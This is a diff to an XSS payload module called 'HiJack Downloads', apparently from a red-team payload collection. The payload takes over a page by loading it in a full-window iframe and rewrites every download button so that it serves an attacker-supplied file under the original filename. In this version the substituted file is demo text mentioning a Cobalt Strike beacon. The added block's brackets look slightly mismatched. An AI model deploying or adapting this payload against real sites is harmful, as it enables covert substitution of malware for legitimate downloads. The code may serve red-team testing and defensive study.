@@ -2,7 +2,7 @@ HiJack Downloads
 
 ------$$gr4y-r0se$$------
 
-Checks if the payload is already running, and if not, renders the application in an iFrame. Then, anytime the user navigates, updates the URL, and changes the onclick of any button or anchor tag to instead alert an attacker controlled message.
+Checks if the payload is already running, and if not, renders the application in an iFrame. Then, anytime the user navigates, updates the URL, and changes the onclick of any button or anchor tag to instead donwload an attacker controlled file.
 
 ------$$gr4y-r0se$$------
 
@@ -11,11 +11,22 @@ text/javascript
 ------$$gr4y-r0se$$------
 
 if (window.self === window.top) {
-
-    function newDownloadFunction(event) {
-        event.preventDefault();
-        alert('Download button hijacked');
+    async function fetchFileAndGetFileName(url) {
+        const response = await fetch(url);
+        const contentDisposition = response.headers.get('Content-Disposition');
+        let fileName = '';
+        if (contentDisposition) {
+            const fileNameMatch = contentDisposition.split('=');
+            if (fileNameMatch && fileNameMatch[1]) {
+                fileName = fileNameMatch[1];
+            }
+        }
+        if (!fileName) {
+            fileName = url.split('/').pop();
+        }
+        return fileName;
     }
+
     function resizeIframe() {
         const iframe = document.getElementById('hijacked');
         iframe.style.width = window.innerWidth + 'px';
@@ -30,12 +41,28 @@ if (window.self === window.top) {
 
         buttons.forEach(button => {
             if (button.textContent.trim().toLowerCase().includes('download')) {
-                button.onclick = newDownloadFunction;
-            }
-        });
+                button.onclick = async function(event) {
+                    event.preventDefault();
+                    const document_href = button.href; 
+                    const fileName = await fetchFileAndGetFileName(document_href);
+                    const fileContent = 'Gr4y-r0se hijacked your download! Imagine if this had been a CS beacon...';
+                    const blob = new Blob([fileContent], { type: 'text/plain' });
+                    const link = document.createElement('a');
+                    const blobURL = URL.createObjectURL(blob);
+                    link.href = blobURL;
+                    link.download = fileName;
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                    URL.revokeObjectURL(blobURL);
+                    }
+                };
+            })
     }
+    
     var body = document.getElementsByTagName('body')[0];
     const page_url = location.pathname;
+    body.setAttribute('style','overflow: hidden;');
     body.innerHTML = '<iframe src="" id="hijacked"  scrolling="no" style="border: none;  overflow: hidden;"></iframe>';
     resizeIframe();
     const iframe = document.getElementById('hijacked');
